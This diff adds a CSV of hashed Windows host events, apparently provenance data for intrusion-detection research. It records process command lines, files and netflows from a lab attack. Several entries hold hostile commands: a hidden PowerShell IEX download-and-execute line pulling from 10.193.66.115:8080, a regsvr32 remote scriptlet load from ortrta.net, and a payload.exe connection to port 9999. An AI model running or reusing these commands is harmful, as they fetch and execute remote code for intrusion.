@@ -1,0 +1,131 @@
+04b781c64f949a39713daa39c6d1b47ed8ccdf221726fa878827769a2ba95cb6,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},454155
+1e367e736c1abe9b639df8478476242ed1ed705c590e90b0cbdd7eccc296ae7a,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},454156
+e593bed780445d2c8447737cdf08e347f63df917a52c32a98d662e16439cf0bf,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x1cc'},454159
+09f2cb1cab9f36a6d3b80c5e08d8adab0a1eaad293d65e316feba7f7229145ca,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x1cc'},454160
+d5acd206cb218408b516cdae21e56181c85e0338d0c07fc1b6edb43cd3d89dad,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},454161
+1f6efc6477ca63b16166b810e5888e7a7c570906eb0c6a963b0fbd8519911c03,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},454162
+1342b6a901d706cc74d4c7db8ae92a9ba2d9f62b424292ae7afc7bb96aa14e37,"{'file': 'HKU/S-1-5-21-450080267-1945256726-3465656282-1000/Software/Classes/Local Settings/MuiCache/3C/52C64B7E/@C:/Windows/system32/WindowsPowerShell/v1.0/powershell.exe,-101'}",453139
+a134c9e170111ad2a3082981e1a858ff21aa11a00b5753859369c57a1956c22f,{'netflow': '192.168.223.128:50411->34.107.221.82:80'},453652
+5dea646e276bcb1765f3c700de1fa220f4f12af763379b638409b7cb1a9d180c,{'subject': 'c:/windows/system32/consent.exe consent.exe 976 378 0143F3C8'},454163
+015c109f4f23c8f712165fdac6037bb4fdd407c9b464751ced825c6ff2a09b89,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},454164
+bde14c88af8a9ed77edcd127aeb3db9e2d279034f5fdcec978ac7fd77ede3f56,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},454165
+5fbf3a580e387f9f05452867bbf85a8734d7102bb86f4c70ece95baa2baebd38,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=1816.0.570174071/1227199140 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  1816 /./pipe/gecko-crash-server-pipe.1816 tab'},451096
+68609a1024fcee90e0bfbce36f0641a895e9e337e5e7a30ec7e153d8a92759cf,{'netflow': '192.168.223.128:49294->34.107.221.82:80'},451097
+bbb0bc77e654b7cff0faa53d0df36fb50534b9ce12a302cf8ce4817808ff47f2,{'file': 'c:/windows/system32/cmd.exe'},538
+8ab5470b3c85fd44ebd6689aa5f4685d2771700e447fb1eea2666c2ee9256cc2,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},454166
+9fe2c63b205b209114b397a87263999249c759e137a62643a7e03666ae7c662d,{'subject': 'c:/python27/python.exe python  -m SimpleHTTPServer'},451091
+7eef88631d91832484c4c4e30c34ad9dd9f6b5502d2f02d33c76be89fd35ae3e,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},453149
+1e6c3410878c8a0b28d21a7c0f9c2d552937ce9b4e864628232a0228020c7019,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=1816.5.1114228392/1378008796 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  1816 /./pipe/gecko-crash-server-pipe.1816 tab'},451104
+5ffe6c979758ed98bbdeb2682958b5e2f8edf028e0e4b4d4172c435d649dcbd0,{'file': 'c:/windows/explorer.exe'},14375
+bb1cbcf3dabfc6f45dc55a2d794b53d83a7d3f011c541736accbd1514364aabd,{'file': 'c:/windows/system32/taskhost.exe'},115770
+3e39a2646d868af6f69159979e119dcf8fc321bcdac3c8288cd144487c84e702,{'file': 'c:/windows/system32/api-ms-win-core-synch-l1-2-0.dll'},63
+4e9c2e1b5c0ff46460ada4e4b1c948870a184800c283c086ce201cab3b002dd3,{'file': 'c:/windows/system32/conhost.exe'},115786
+7d1fabe552db807092471963e41589146c87ec2a75a57e404c48c5eb4ed5c124,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},451658
+5f94f3e209a5ee95753828cb3650be64b092a214447328eec258b3911107cc1d,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},451666
+8057a2cde2daaf36cdcab286624fe967afb76aca6f1fe800578c336c101f2117,{'netflow': '192.168.223.128:8000->10.193.66.115:40273'},452182
+029820964152c2f2df80fdc6d3fd1145efa8967b96c9424043fca1aa5e7c52aa,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe'},452183
+99b6e3a9180609a2e6b13ae8446f3b4aaa3d2ea6b60dbb414c02028c408e1144,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},452184
+eb792ba932fc731eaf90d508c4598d7b2f50282020fb41e7776b63f27d776527,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -379537827-693394473-11381763951281461077-714604386-48066713-13309046951211807767'},452185
+0f2c37f03896dda3e1052a7ec8161d86e978fc4e2eac376acc3ed3043aa783b1,{'subject': 'c:/users/aalsahee/payload.exe payload.exe'},452186
+db1953c0a9eb7bf48f428f5563631c5ae9a6caad48f0ee245bcbba5803c1cc8f,{'netflow': '192.168.223.128:50421->10.193.66.115:9999'},452187
+f942f9157a6fc3c72f9812a1cd3ffcf6e2f38840e7281931d5cf6d27c4eef5ba,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k WerSvcGroup'},452188
+5c0017c0283e25fe6db8d8d6e1e243b10e9cfc9d30a17f080ff9c22503c18599,{'subject': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -nop -w hidden -c IEX ((new-object Net.WebClient).DownloadString(http://10.193.66.115:8080/fygPgMir5J));'},452194
+2f148e2ae3944335c84364e06a609ba84c22dc92ab85ffe56e0b6d09aea8649d,{'subject': 'c:/program files/microsoft office/office14/excel.exe C:/Program Files/Microsoft Office/Office14/EXCEL.EXE  /Embedding'},451683
+6c04df483dd41ba51ed5874ad4c3385f50956ae2415141caf8c967186847128c,{'file': 'c:/users/aalsahee/payload.exe'},425573
+1198443cad8b7d0a0ab961b56d080efd1dbf773d1b5383de75322d752afc64f7,{'subject': 'c:/windows/system32/regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/fygPgMir5J.sct scrobj.dll'},452198
+7fdaf2a8fbb0254959ebd99b9b31c48a2f833d1f970223e92d83618d5d315387,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -5236576131384318209-3280849-1423799609048581212087173938-1556252708-125986651'},452199
+f41a84ccfe4aef6552a720956b39422e1fcfa97bcd900ff8003426b82d3e8526,{'subject': 'c:/program files/common files/microsoft shared/officesoftwareprotectionplatform/osppsvc.exe C:/Program Files/Common Files/Microsoft Shared/OfficeSoftwareProtectionPlatform/OSPPSVC.EXE'},451699
+790e8476b6bcff34455e3a4fb5c1967a0a0ee5b7a539d5c852f31432326b9fea,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},450686
+da058b1e54b3e4fe986ee7a7ef0a060a6d6d2bcd51c9763a0c44ef3133b3461c,{'subject': 'c:/windows/explorer.exe C:/Windows/explorer.exe '},453759
+66c14c0561a328d932ff6e423d8ec304a9e1dad95cc1ee1d883a72685f127a00,{'subject': 'c:/program files/microsoft office/office14/excel.exe C:/Program Files/Microsoft Office/Office14/EXCEL.EXE /dde'},450688
+0f7df5ed22afe9972d5eb5a3de57d5984d63fa395aa7db2e4848e27ea91f55a1,{'file': 'c:/windows/sysmon.exe'},85119
+3ab17882fd561f175248d8358d8b554a7133cd2426144bef4ae9eb53816391ec,{'file': 'c:/users/aalsahee/index.html'},162440
+cf69c704a6fb9e2cc5997c811b54cf5369b61f83c236170ebb7b7603c33e4dfd,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE '},452256
+9fc46fecd79f5630f16d281052bd75f52ab90b26abc206c334c7d8e46d74c455,{'file': 'c:/windows/system32/dllhost.exe'},77472
+55370c84a6e31434690b8e98ee96a473357a7683c264db697055c68d4d76a1fa,{'file': 'c:/windows/system32/mmc.exe'},78504
+80dca16e53e5153d021df2a298028a85bb75b805f13f7307214ddf926fcfb039,{'file': 'c:/windows/system32/searchprotocolhost.exe'},22702
+ca111d2638d92f10666c33cac6cdb348860d06ac491aefa26e71c73c0938082a,{'file': 'c:/windows/system32/macromed/flash/flashplayerupdateservice.exe'},6838
+e2d25c55d94c564e7853d403ee7365f331774634af17a079d2bd3649b05a8740,{'file': 'c:/python27/python.exe'},1207
+25b06fdb9860f3425dd119352eb0f6c0b229ecafce91580a7b9174faa9ca48ca,{'file': 'c:/windows/system32/taskeng.exe'},145593
+3227e7f097341db44ca7ef5e460bbbf7d596c74d18382040dfac5072b48e973e,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},453847
+c4e8af13873a307843bfecb15fd4329a65243fb32218c3af146eb981510288bb,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe8_ Global/UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},452324
+29090ee43b130fab78966a8c6379ec9706a00bb74e802e121e32398b149fae23,{'file': 'c:/windows/system32/wbem/wmiapsrv.exe'},115946
+54feb552a039faac7ca2dffc4f72339d64cc3694fa29afb82980ec34ed88c905,{'subject': 'c:/windows/system32/taskeng.exe taskeng.exe {0C061AD1-FE03-4C72-9C76-B668977EC59B} S-1-5-18:NT AUTHORITY/System:Service:'},451328
+5af7092214be9cf13e7b30a3a1d71cdecbec7661df47c97c3e22066a5296798d,{'subject': 'c:/windows/system32/macromed/flash/flashplayerupdateservice.exe C:/Windows/system32/Macromed/Flash/FlashPlayerUpdateService.exe '},451330
+d9b05c070057355dab9dca7baff6764d138c5e85857c6ad17e44bca1dc075d5d,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -969350672-1997507567-18285234771300829986-952319022-1519614706-1579080082229799440'},451331
+8b71202901e337e2f8a552e6b75dd17b11f00ad9ec3b23937d151a7782cb5bc1,{'file': 'c:/program files/mozilla firefox/firefox.exe'},1284
+528dc81ac13126d40c2eb015fc99053250655a140c7d5cd65ca22236e58df9d0,{'subject': 'c:/windows/system32/macromed/flash/flashplayerupdateservice.exe C:/Windows/system32/Macromed/Flash/FlashPlayerUpdateService.exe'},451332
+e756e08030cc3dc4d3e8ae0ced357600dee8db2f0d895e7a7b4312499b5f89bb,{'subject': 'c:/program files/microsoft office/office14/winword.exe C:/Program Files/Microsoft Office/Office14/WINWORD.EXE  /Embedding'},453895
+d14bf11d49c48da7c390661015ae1c196fcc6c690bd870162f111f92abefe861,{'file': 'c:/windows/system32/audiodg.exe'},245523
+6674f19b784ff5bda21cb0cdedf812a27b2769a856325264557fb2cde978e1e4,{'file': 'c:/program files/common files/microsoft shared/equation/eqnedt32.exe'},453913
+c3832dca4e4a98c16116b6e2e4adffc4cf6c8f8225c03b45d9c5feeb8e86f6c6,{'file': 'c:/windows/system32/regsvr32.exe'},453915
+bb797ef0f43ddc0019fbc02064a84e8965d7152da8b1e804a05e936766b07b96,{'file': 'c:/windows/system32/notepad.exe'},20251
+a805b9cf0d0d220aca4f532339b7a99a30e6fe49df477e73a415728e0c1e04ba,{'subject': 'c:/windows/system32/werfault.exe C:/Windows/system32/WerFault.exe -u -p 5124 -s 344'},453918
+7c0cff887578cd5bcf651e393228b8f8a66885c1686c0ece29227ec7b7429378,{'file': 'c:/windows/system32/consent.exe'},203553
+f87c592993318b7c9234ae9cc43c48fbb0dd48e08034e9d39df6c5044f552ba5,{'netflow': '192.168.223.128:49183->34.107.221.82:80'},450349
+9d9275e30fc2748b8e1247a74709e851b1c1dd6cfa4a8712339e829b0f02352b,{'file': 'c:/program files/microsoft office/office14/excel.exe'},1325
+cbe2a221c69beaeff680b631ea18cde8fd920fc24f84f1dea19e9171a2b5a4b0,{'file': 'c:/program files/microsoft office/office14/winword.exe'},1336
+2c5791c9d9cc94e7acd04eb5d162b477dad544004efa9c15fc275e6df9eba2ac,{'file': 'c:/windows/system32/wermgr.exe'},344893
+79cf09b6a6f4384e0ec839928f0e48780faf759279becaa509e827b5efbf3132,{'file': 'c:/windows/system32/werfault.exe'},124747
+7e17dc10a69150291b74204fdfff2402cf14388419322ef5a09b48391c852e86,{'subject': 'c:/windows/system32/services.exe C:/Windows/system32/services.exe'},450907
+abd56519f365fe7f14839d98d803b3e1956c9696e05b6b959a0624ca34c44394,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},453979
+bb3d832c60eb0deacc0fbe8005517dcd9c89371786102146d0b134ad2ae2a5a0,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k LocalSystemNetworkRestricted'},450909
+12c6d19c70c619853f46108cf091fbdb47c59be53430e0c1b7bc9a7357e59fe7,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe '},450912
+227448ab8d090d181add7d289b92caaab5f5eee22b52e008fe32bc825c1c3328,{'file': 'c:/program files/common files/microsoft shared/officesoftwareprotectionplatform/osppsvc.exe'},1376
+0b1f52205ced70b9fd84ef3ce24cbabcee37416aed61dddcdbc2f7fe81d930a1,{'file': 'c:/windows/system32/svchost.exe'},189794
+0a807756a44898f8f846f8bf835b9c61c2c41c3f2c8a866beca6c90006ab2e77,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k NetworkService'},450919
+520d57fe587c9ebdab0dedb2f36f59bd3667d70f0ad78a530e5a6d142c4a97d4,{'subject': 'c:/windows/sysmon.exe C:/Windows/Sysmon.exe'},450921
+67e5004becd7c9e7870ab7b35d1d4424c6ffa85a1fa0137e5ff14f0759e2aeeb,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k LocalServiceNetworkRestricted'},450922
+de8b5af0756da55b4b04fdae6899455f2f20a25477ec6599c4f0a81b2739dba4,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k secsvcs'},450923
+3054ad0f97860931ecbbe3bffd69a5ba9c02d99e0ed48328ad6f675d493bf989,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k RPCSS'},450925
+bb2e251b5fad0a2bfb57768971607ecae9aea0f7f2604c2c671849d9a835584e,{'subject': 'c:/windows/explorer.exe C:/Windows/Explorer.EXE'},450926
+154245852ce49f84f3539c92bc0686d05e794aaaea4f1c6cbcef889723c12a34,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k DcomLaunch'},450927
+cee6bc7eef22a2bb88dc6330751eb5fbc065ce7d402c938a1a80a6d1a1516b3c,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},453487
+1edd8e493302f701f6b1ace5f526dea045441f0f8263355dffc7045553eab629,{'subject': 'c:/program files/mozilla firefox/firefox.exe C:/Program Files/Mozilla Firefox/firefox.exe -contentproc --channel=2176.0.2140493031/306218308 -greomni C:/Program Files/Mozilla Firefox/omni.ja -appomni C:/Program Files/Mozilla Firefox/browser/omni.ja -appdir C:/Program Files/Mozilla Firefox/browser  2176 /./pipe/gecko-crash-server-pipe.2176 tab'},450929
+3321733499d9921228f8fb04cf4ae1067b53cd7f4bacc26e31d31cc9bbafa79e,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k netsvcs'},450930
+6f6787972b2095330dcadf7a7a603c65bdceed715197c6aa32be6ecde8821201,{'subject': 'c:/windows/system32/msiexec.exe C:/Windows/system32/msiexec.exe /V'},450928
+88109bbbd0117eacd57535fddb966447cdda73c364687494715605ea6e5a4ab4,{'subject': 'c:/windows/system32/wbem/wmiprvse.exe C:/Windows/system32/wbem/wmiprvse.exe'},450931
+53e3a1da766e3d0643430c4c6462e845a6a59c66430a6f2a615100f82be5762e,{'subject': 'c:/windows/system32/audiodg.exe C:/Windows/system32/AUDIODG.EXE 0x340'},450934
+06cbd357f2dcf9213346218c6da6ede484828ac68fdd0796f7ad720dcf3df79a,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k bthsvcs'},450935
+412fe1ad5b57169f457e2d47eae4f741b5912d197e9225c256984bfbfd1cc9d4,{'subject': 'c:/windows/system32/wermgr.exe C:/Windows/system32/wermgr.exe -queuereporting'},453497
+67e2962fac4d11acad4a451449652bec7fc30652f6bb130b6412467f283604bb,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/System32/svchost.exe -k swprv'},450941
+29d59814d85ceefbdab1368e69ae58612af880144f5271021d7eacd064251ece,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{D2FE8F47-D0BC-443A-B30F-841E8D5063B0}'},450943
+bb22595e02d71c1f2786fd54300f43f034c3c1aff81b4ff6e0f103889065c1ef,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceAndNoImpersonation'},450944
+4d7cf957837cfc1a1f5c18f83bbb1b57e7f05765bb1be5b7d939682d282bcc37,{'subject': 'c:/windows/system32/lsass.exe C:/Windows/system32/lsass.exe'},450947
+515218e3ccdeef3a102df811889f49b1f7de0e47f85da2b3d0b20cea39a0a300,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 13763103422011309822914563887882091699-1947208044977427783-9663239521393932520'},450950
+ddadd66733333ad6d7f9e318710ee27b1892cc7124f1db4ad5e041b319a4e461,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalServiceNoNetwork'},450952
+2abd6a1daae33aea6cbcf6d381313645be96751af0e8e3363586a24f6dee7125,{'subject': 'c:/windows/system32/vssvc.exe C:/Windows/system32/vssvc.exe'},450954
+ac71cf9f7b349e1acce67a41aefec6544a0a7963cf0b8c74c2a11ce6afb4fd71,{'subject': 'c:/windows/system32/svchost.exe C:/Windows/system32/svchost.exe -k LocalService'},450955
+9afc30d572a8817f330ed5fbbc09e9cc7c46085cd9d9dd3d9d9b3395e8c9e921,{'subject': 'c:/windows/system32/wbem/wmiapsrv.exe C:/Windows/system32/wbem/WmiApSrv.exe'},450956
+3a6ae826cd67318f61d322cec311bdcae00647413b6ba15efd1a98a197279cdc,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe'},450957
+d3aecea312530e075a39682bcc2e79423d3e64d3df9f7a49709a5f02de3197bb,{'netflow': '192.168.223.128:50742->34.107.221.82:80'},453007
+0f16f48ed292d854d9aceeb7bbd287490b91f2646e7fa8e4408fc646152bba83,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},450981
+97bd74cedffcf6a5b479a1d9ff8ccaecb75136c02c83c1b2791c3dd9f9e3773e,{'subject': 'c:/windows/system32/consent.exe consent.exe 976 378 0143E4C8'},450982
+bfbf6a32a21442f9ebcd0e2323c9cce17e19d6c8ffd31b59f45d0cc7aa8aaa94,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},450983
+10225c3b7059e694d961834b451e7afb7ea533c67e4722cdc37288e1952be623,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}'},450984
+21e982ffcd1dd1ae3c15f11eb46dbd6d9d6b7810df357b446345b8489067c3c9,{'subject': 'c:/windows/system32/mmc.exe C:/Windows/system32/mmc.exe C:/Windows/system32/eventvwr.msc /s'},450985
+4945b34d8a8ec22463fc1dfaa0da5a2d4c28d3d19bf915dcfdf8f520ec1e5344,"{'file': 'HKU/S-1-5-21-450080267-1945256726-3465656282-1000/Software/Classes/Local Settings/MuiCache/3C/52C64B7E/@C:/Windows/system32/notepad.exe,-469'}",454058
+de8ba0d12261c7039e4665155510676fe777048172dbfae049e2566c1db73ac8,{'subject': 'c:/windows/system32/notepad.exe C:/Windows/system32/notepad.exe '},454053
+b041f17cb39af8e80d3cacbfda08b3d97aaafa79345f6c8988eb0a9881bbe213,{'subject': 'c:/windows/system32/searchprotocolhost.exe C:/Windows/system32/SearchProtocolHost.exe Global/UsGthrFltPipeMssGthrPipe10_ Global/UsGthrCtrlFltPipeMssGthrPipe10 1 -2147483646 Software/Microsoft/Windows Search Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot) C:/ProgramData/Microsoft/Search/Data/Temp/usgthrsvc DownLevelDaemon '},454055
+a907e01bfc223b9322be99e3a38a6b5172faf8e1e448af691580e384aa40b498,{'file': 'c:/windows/system32/services.exe'},59822
+f3f4c4d08a415f63af9a84eb5a260a68bbcc5c39028e0c6efe960f96f4d9800a,{'subject': 'c:/windows/system32/wbem/wmiapsrv.exe C:/Windows/system32/wbem/WmiApSrv.exe'},450990
+2f1e302555d8c8a565bf17d70c838005dd350c17ac5dc0fab3842db97461ec13,{'file': 'c:/windows/system32/windowspowershell/v1.0/powershell.exe'},318390
+7afb5f450a53d46941cf8e72c4f3e9f9494b689f7379c5d26d399bd2b80bba23,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/system32/cmd.exe /c C:/Users/aalsahee/Desktop/start_dns_logs.bat '},451023
+be007d7687a383e26cbf79da062b1202d7c924eed9a67465edd0c5c8435901d4,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -4470186931068931293-12802258051378793808-10534021570140001431741861-1391879193'},451024
+1b148ef12fde7dab8f4df7c2d4fb35eadfc0bca5ad1f2d39880a9b61daa75695,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},451026
+f4423293f08d1c361cfe797cef7020616c20121842e7e39c1caab0a420b996ce,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1994779655-14299841871329300633676507262881001423-747795893387687757-1251788913'},451028
+c652054cb0ea5e4c0114ef240b6bdfbacf0804717119e204c9486985d303da4d,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe -1649270142-2115631636556665374-682232890-17753742811454400941361426829-1882342751'},451032
+7ad31090dcd96f00bfe9de55c198253cca240946c2b6b0abc60b6d34501347e4,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1080090169312658974-179795665379865700-1922378033806028356-291326314-2057732959'},451034
+3a6066b875db8594dbfd7fcab377ab67ffb02f8ee362f27db160ebe1f2537a16,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 78246223119650366492194935186285944814467575181888833745835058950-749998355'},451038
+9539554f0ac7a465b8cb5b4def316fb5ab85a2f1494fe369bfbc0c3e3c1d70a8,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}'},454110
+55632eeeaa7a4a907d50d7d674cc9d4f3df51aa10c1838ecebc5998d006d9117,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe $(Arg0)'},451040
+cf46408c294c294a6b359af4e7590eb29309ba621c4017feb3bf1e40af669fd4,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 1479280960-47411440377648180420041018731960901024-1559377529672230265-176788019'},451044
+14d520cfaa716ac1903a3d5230eafffaead8932c399a4377a0bb46fcc5ee87ca,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}'},451045
+d2a391a9ab13ca58bf78a36af9c2b9b2ef05495a0b6903afa1454a2d1a40543f,{'subject': 'c:/windows/system32/cmd.exe C:/Windows/System32/cmd.exe '},451049
+2c8e6f147489324fea2aeae156b0423c7f2870e5e403c449cdc16f6aa0669e93,{'subject': 'c:/windows/system32/conhost.exe /??/C:/Windows/system32/conhost.exe 849677362522143842496438751532878331-1604102853-186280905915470190601631015574'},451050
+5e5675cd9e52df643ab3b93657cd61e5bb3d86eca008aa4243f4112e5afd9222,{'netflow': '192.168.223.128:50393->10.193.66.115:8080'},453611
+738a79535a93aefee216683588c19872b1ef52305c7ddb6aee0471840d061b03,{'netflow': '192.168.223.128:50394->10.193.66.115:8443'},453612
+59118d8651d4f4e4eac78a0501e86f8d5f1a67b4131b42d4fc203cf5cc112ab8,{'subject': 'c:/windows/system32/taskhost.exe taskhost.exe $(Arg0)'},452076
+59c5854e20b8e13e822b0eb20a141a9e809614db841bf68bbe1bdbd223a85990,{'subject': 'c:/windows/system32/dllhost.exe C:/Windows/system32/DllHost.exe /Processid:{F9717507-6651-4EDB-BFF7-AE615179BCCF}'},453613
+6ea431447c5a0b9a15b76c3cd06b4fecabdeb21b9abaccd560cdb9763102e10a,{'netflow': '192.168.223.128:50392->10.193.66.115:8080'},453109
+c719a498874a0d172ea89826c04873f653792141de6987a8c93e26723909c64c,{'subject': 'c:/program files/common files/microsoft shared/equation/eqnedt32.exe C:/Program Files/Common Files/Microsoft Shared/EQUATION/EQNEDT32.EXE -Embedding'},453111
